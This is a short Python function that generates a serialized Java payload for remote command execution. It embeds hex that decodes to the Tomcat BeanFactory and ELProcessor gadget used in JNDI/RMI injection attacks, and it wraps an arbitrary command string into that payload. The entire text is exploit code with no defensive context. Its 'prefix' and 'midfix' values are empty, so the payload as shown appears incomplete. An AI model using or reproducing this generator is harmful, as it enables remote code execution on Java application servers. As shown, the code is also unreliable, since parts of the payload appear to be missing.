def beanfactory(cmd: str, rmi: bool = True):
    if rmi == True:
        prefix = ""
        midfix = ""
        postfix = "275d292e7374617274282922297070707070787400256f72672e6170616368652e6e616d696e672e666163746f72792e4265616e466163746f7279707400146a617661782e656c2e454c50726f636573736f72"
        length = (len(midfix + cmd.encode().hex()) // 2 + 13).to_bytes(2, byteorder="big").hex()
        hexdata = prefix + length + midfix + cmd.encode().hex() + postfix
        data = bytes.fromhex(hexdata)
        return data
